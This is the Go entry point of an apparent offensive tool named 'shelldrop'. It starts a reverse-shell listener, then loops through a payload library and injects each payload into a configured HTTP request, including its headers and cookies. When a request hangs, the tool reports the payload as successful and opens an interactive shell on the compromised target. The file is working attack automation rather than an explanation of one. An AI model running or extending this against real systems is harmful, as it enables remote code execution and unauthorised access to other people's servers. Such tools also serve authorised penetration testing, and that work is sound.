package main

import (
	"context"
	"errors"
	"os"
	"shelldrop/log"
	"shelldrop/payloads"
)

const (
	ShellDropKeyword = "SHELLDROP"
)

func main() {
	cfg := ParseConfig()
	ctx, cancel := context.WithCancel(context.Background())

	listener := NewListener(cfg.Listener, cancel)
	listener.Start()
	defer listener.Close()

	if injectPayloads(cfg, ctx) {
		listener.Interact()
	} else {
		if cfg.Listener.Disabled {
			log.Warn("Built-in listener is disabled, is your listener running?")
		}

		log.Fatal("No working payloads found.")
	}
}

// todo: improve logging here, some kind of progress bar / dynamic update?
func injectPayloads(cfg *Config, ctx context.Context) bool {
	if cfg.Payload != "" {
		log.Info("Testing 1 payload")
		if injectPayload(cfg.Payload, cfg, ctx) {
			return true
		}
		return false
	}

	names := payloads.GetNames()
	log.Infof("Testing %d payloads", len(names))
	for _, payload := range names {
		if injectPayload(payload, cfg, ctx) {
			return true
		}
	}

	return false
}

func injectPayload(payload string, cfg *Config, ctx context.Context) bool {
	injector := NewInjector(payload).
		WithListenerConfig(cfg.Listener).
		WithMethod(cfg.Request.Method).
		WithUrl(cfg.Request.Url).
		WithData(cfg.Request.Data).
		WithHeaders(cfg.Request.Headers).
		WithCookies(cfg.Request.Cookies)

	if err := injector.Do(ctx); err != nil {
		if os.IsTimeout(err) || errors.Is(err, context.Canceled) {
			log.Successf("Found successful payload: %s", payload)

			if cfg.Listener.Disabled {
				log.Info("Check your listener for the reverse shell")
				os.Exit(0)
			}

			return true
		}

		log.Fatalf("Failed to inject payload: %v", err)
	}

	return false
}
